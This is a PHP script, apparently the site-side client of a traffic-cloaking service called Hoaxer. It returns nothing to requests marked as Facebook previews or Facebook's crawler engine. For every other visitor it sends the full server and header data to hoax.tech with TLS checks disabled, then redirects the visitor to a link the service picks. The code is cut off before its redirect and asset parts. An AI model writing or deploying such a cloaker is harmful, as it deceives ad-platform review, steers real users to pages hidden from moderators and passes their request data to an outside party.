date_default_timezone_set('UTC');
define('HOAX_TIME', time());
define('HOAX_FLOW', '6b7eb56659f6b370ef1bb744937b7c1f');
define('HOAX_ID', md5(uniqid(HOAX_FLOW, true)));
define('HOAX_UTM', 'true');

if (!function_exists('getallheaders')) {
    function getallheaders()
    {
        $headers = [];
        foreach ($_SERVER as $name => $value) {
            if (substr($name, 0, 5) == 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }
        return $headers;
    }
}

new Hoaxer();

class Hoaxer
{
    public function __construct()
    {
        try {
            if (!function_exists('curl_version')) {
                throw new Exception('php-curl extension does not exist');
            }
            $headers = array_change_key_case(getallheaders());
            if (
                isset($headers['x-purpose']) && $headers['x-purpose'] === 'preview'
                || isset($headers['x-fb-http-engine']) && $headers['x-fb-http-engine'] === 'liger'
                || isset($headers['hoax-curl'])
            ) {
                return;
            }

            if (isset($_POST['hdata'])) {
                $this->responser(
                    $this->utmTransfer(
                        json_decode($this->curlSender('extended', $_POST['hdata']), true)
                    )
                );
            }

            new Redirect(
                $this->utmTransfer(
                    json_decode($this->curlSender('basic', $this->dataCollector()), true)
                ));
            echo $this->appendAssets();

        } catch (Exception $e) {
            $this->responser([$e->getMessage()]);
        }
    }

    private function utmTransfer($response)
    {
        if ($response['status'] === 'ok' && !empty($_GET) && HOAX_UTM === 'true') {
            $parsedUri = parse_url($response['link']);
            $start = (empty($parsedUri['query'])) ? '?' : '&';
            $response['link'] = $response['link'] . $start . http_build_query($_GET);
        }
        return $response;
    }

    private function dataCollector()
    {
        $_SERVER['time'] = HOAX_TIME;
        $_SERVER['bhash'] = HOAX_ID;
        $_SERVER['flow_hash'] = HOAX_FLOW;

        array_walk_recursive($_SERVER, function (&$parameter) {
            $parameter = htmlspecialchars($parameter);
        });

        return base64_encode(json_encode($_SERVER));
    }

    private function appendAssets()
    {
        return str_replace(
            ['---HOAX_TIME---', '---HOAX_ID---', '---HOAX_FLOW---', '---HOAX_COOKIE---'],
            [HOAX_TIME, HOAX_ID, HOAX_FLOW, HOAX_FLOW],
            $this->assets());
    }

    private function curlSender($type, $data)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
        curl_setopt($ch, CURLOPT_URL, "https://hoax.tech/api/v2?type=$type");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "data=$data");
        if (!$response = curl_exec($ch)) {
            throw new Exception('cURL error: ' . curl_error($ch));
        }
        curl_close($ch);
        return $response;
    }

    private function responser($response)
    {
        if (is_array($response)) {
            $response = json_encode($response);
        }
        header('Content-Type: application/json; charset=utf-8');
        exit($response);
    }

